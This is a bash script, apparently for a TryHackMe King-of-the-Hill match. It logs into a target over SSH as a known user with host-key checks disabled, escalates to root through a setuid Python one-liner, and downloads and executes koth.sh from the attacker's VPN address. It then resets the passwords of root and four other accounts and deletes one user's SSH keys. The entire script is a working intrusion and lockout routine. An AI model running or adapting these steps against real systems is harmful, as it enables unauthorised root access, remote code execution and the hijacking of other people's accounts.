#!/bin/bash



read -p "Your TryHackMe username: " nick
read -p "Enter the machine IP address: " ip_address
read -s -p "Enter the new password: " password

vpn=$(ip a show dev tun0 | awk '/inet / {print $2}' | cut -d'/' -f1)

ssh -o StrictHostKeychecking=no rcampbell@"$ip_address" << EOF


    
    /usr/bin/python3.6 -c 'import os; os.setuid(0); os.system("/bin/sh")'

    cd /boot && wget http://$vpn/koth.sh && chmod +x koth.sh && ./koth.sh "$vpn" "$nick"
    echo "root:$password" | chpasswd
    echo "rcampbell:$password" | chpasswd
    echo "gcrawford:$password" | chpasswd
    echo "tryhackme:$password" | chpasswd
    echo "production:$password" | chpasswd
    rm -rf /home/gcrawford/.ssh
EOF

